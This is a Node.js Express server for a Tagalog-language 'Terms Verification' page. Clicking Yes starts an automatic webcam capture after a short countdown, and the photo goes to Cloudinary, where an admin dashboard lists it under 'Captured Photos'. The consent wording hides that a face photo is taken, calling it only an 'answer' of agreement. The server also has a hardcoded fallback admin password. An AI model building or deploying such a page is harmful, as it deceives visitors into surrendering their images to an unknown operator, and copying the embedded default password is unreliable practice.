// server.js — verification app with Cloudinary storage (v2 compatible)
const express = require('express');
const session = require('express-session');
const multer = require('multer');
const crypto = require('crypto');
const { v2: cloudinary } = require('cloudinary');
const { CloudinaryStorage } = require('multer-storage-cloudinary-v2');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------- CONFIG ----------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '1590579072523';
const ADMIN_HASH = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
  secure: true
});

const storage = new CloudinaryStorage({
  cloudinary,
  params: {
    folder: 'verify-pics',
    format: 'jpg',
    public_id: () => `${Date.now()}_${crypto.randomBytes(6).toString('hex')}`
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => cb(null, file.mimetype === 'image/jpeg')
});

// ---------- MIDDLEWARE ----------
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 }
}));

function requireAdmin(req, res, next) {
  if (req.session?.isAdmin) return next();
  res.redirect('/pics/login');
}

// ---------- LANDING / CONSENT + AUTO-CAPTURE ----------
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DASHBOARD</title>
<style>
  body{font-family:system-ui;background:#0d1117;color:#e6edf3;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}
  .card{width:100%;max-width:440px;background:#161b22;border:1px solid #30363d;border-radius:12px;padding:28px;text-align:center}
  h1{font-size:17px;margin:0 0 8px}
  .sub{color:#8b949e;font-size:13px;line-height:1.5;margin-bottom:18px}
  .note{color:#d29922;font-size:12px;background:#d2992222;padding:10px;border-radius:8px;margin-bottom:18px;text-align:left;line-height:1.5}
  button{padding:10px 20px;border-radius:8px;border:1px solid #30363d;font-size:14px;cursor:pointer;background:#21262d;color:#e6edf3}
  button.primary{background:#238636;border-color:#2ea043;color:#fff}
  .row{display:flex;gap:10px;justify-content:center;margin-top:16px}
  video{width:100%;border-radius:10px;background:#000;display:none;transform:scaleX(-1)}
  #status{font-size:13px;color:#8b949e;margin-top:14px;min-height:20px}
  .count{font-size:56px;font-weight:700;color:#58a6ff;margin:10px 0}
  .hidden{display:none!important}
  .check{color:#3fb950;font-size:48px}
</style>
</head>
<body>

<div class="card" id="consentCard">
  <h1>🔒 Terms Verification</h1>
  <p class="sub">
    Para makapasok, kailangan i-verify ang pag agree. Sa pagpindot ng <b>Yes</b>,
    kukuhanan ka ng <b>isang sagot na pag agree mo</b> at <b>ipapadala ito sa system</b>
    para sa verification.
  </p>
  <div class="note">
    ⚠️ Kapag pinindot mo ang <b>Yes</b>, automatic na kukuhanan ka ng sagot
    pagkatapos ng <b>3-second countdown</b>. Walang pangalawang confirm.
  </div>
  <div class="row">
    <button class="primary" onclick="giveConsent()">✔ Yes, mag-verify</button>
    <button onclick="denyConsent()">✖ No</button>
  </div>
</div>

<div class="card hidden" id="cameraCard">
  <h1>Tingin sa camera</h1>
  <video id="preview" autoplay playsinline muted></video>
  <div class="count" id="countdown">3</div>
  <div id="status">Inihahanda ang camera…</div>
</div>

<div class="card hidden" id="doneCard">
  <div class="check">✔</div>
  <h1>Verified</h1>
  <p class="sub">Naipadala na ang sagot mo. Salamat!</p>
</div>

<script>
let stream = null;

async function giveConsent() {
  document.getElementById('consentCard').classList.add('hidden');
  document.getElementById('cameraCard').classList.remove('hidden');
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode:'user', width:640, height:480 }, audio:false
    });
  } catch(e) {
    document.getElementById('status').textContent = 'Camera error: ' + e.message;
    return;
  }
  const v = document.getElementById('preview');
  v.srcObject = stream;
  v.style.display = 'block';
  document.getElementById('status').textContent = 'Kukunin ang litrato sa…';

  let n = 3;
  const cd = document.getElementById('countdown');
  const timer = setInterval(() => {
    n--;
    if (n > 0) cd.textContent = n;
    else { clearInterval(timer); cd.textContent=''; captureAndUpload(); }
  }, 1000);
}

function denyConsent() {
  alert('Hindi ka na-verify. Walang litratong kinuha.');
}

function captureAndUpload() {
  const v = document.getElementById('preview');
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  c.getContext('2d').drawImage(v, 0, 0);
  c.toBlob(blob => {
    const fd = new FormData();
    fd.append('photo', blob, 'verify.jpg');
    fetch('/api/verify-upload', { method:'POST', body:fd, credentials:'include' })
      .then(() => {
        stopCamera();
        document.getElementById('cameraCard').classList.add('hidden');
        document.getElementById('doneCard').classList.remove('hidden');
      })
      .catch(() => {
        document.getElementById('status').textContent = 'Upload failed.';
        stopCamera();
      });
  }, 'image/jpeg', 0.9);
}

function stopCamera(){ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; } }
</script>
</body>
</html>`);
});

// ---------- UPLOAD ENDPOINT ----------
app.post('/api/verify-upload', upload.single('photo'), (req, res) => {
  if (!req.file) return res.status(400).json({ ok: false });
  console.log(`[upload] ${req.file.path} from ${req.ip}`);
  res.json({ ok: true });
});

// ---------- /pics LOGIN ----------
app.get('/pics/login', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin Login</title>
<style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
form{background:#161b22;border:1px solid #30363d;padding:28px;border-radius:12px;width:300px;text-align:center}
input{width:100%;padding:10px;margin:10px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;box-sizing:border-box}
button{width:100%;padding:10px;border-radius:8px;border:1px solid #2ea043;background:#238636;color:#fff;cursor:pointer;font-size:14px}
h2{margin:0 0 10px;font-size:16px}
</style></head><body>
<form method="POST" action="/pics/login">
  <h2>🔒 Admin Access</h2>
  <input type="password" name="password" placeholder="Password" autofocus required>
  <button type="submit">Enter</button>
</form>
</body></html>`);
});

app.post('/pics/login', (req, res) => {
  const hash = crypto.createHash('sha256').update(req.body.password || '').digest('hex');
  if (hash === ADMIN_HASH) {
    req.session.isAdmin = true;
    return res.redirect('/pics');
  }
  res.status(401).send('Mali ang password. <a href="/pics/login">Subukan ulit</a>');
});

// ---------- /pics DASHBOARD ----------
app.get('/pics', requireAdmin, async (req, res) => {
  try {
    const result = await cloudinary.api.resources({
      type: 'upload',
      prefix: 'verify-pics/',
      max_results: 100,
      direction: 'desc'
    });
    const files = result.resources || [];
    const cards = files.map(r => `
      <div class="pic">
        <a href="${r.secure_url}" target="_blank" rel="noopener">
          <img src="${r.secure_url}" loading="lazy">
        </a>
        <div class="meta">${new Date(r.created_at).toLocaleString()}</div>
      </div>`).join('');
    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Pics Dashboard</title>
<style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;margin:0;padding:24px}
h1{font-size:18px;margin:0 0 20px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px}
.pic{background:#161b22;border:1px solid #30363d;border-radius:10px;overflow:hidden}
.pic img{width:100%;display:block;aspect-ratio:4/3;object-fit:cover;background:#000}
.meta{font-size:10px;color:#8b949e;padding:6px 8px;word-break:break-all}
.empty{color:#8b949e;font-size:14px}
.logout{float:right;color:#8b949e;font-size:12px;text-decoration:none}
</style></head><body>
<a class="logout" href="/pics/logout">Logout</a>
<h1>📸 Captured Photos (${files.length})</h1>
${files.length ? `<div class="grid">${cards}</div>` : `<p class="empty">Wala pang litratong nakuha.</p>`}
</body></html>`);
  } catch (e) {
    res.status(500).send('Cloudinary error: ' + e.message);
  }
});

app.get('/pics/logout', (req, res) => {
  req.session.isAdmin = false;
  res.redirect('/pics/login');
});

// ---------- START ----------
app.listen(PORT, () => {
  console.log(`✅ Running on port ${PORT}`);
  console.log(`   Dashboard: /pics`);
});
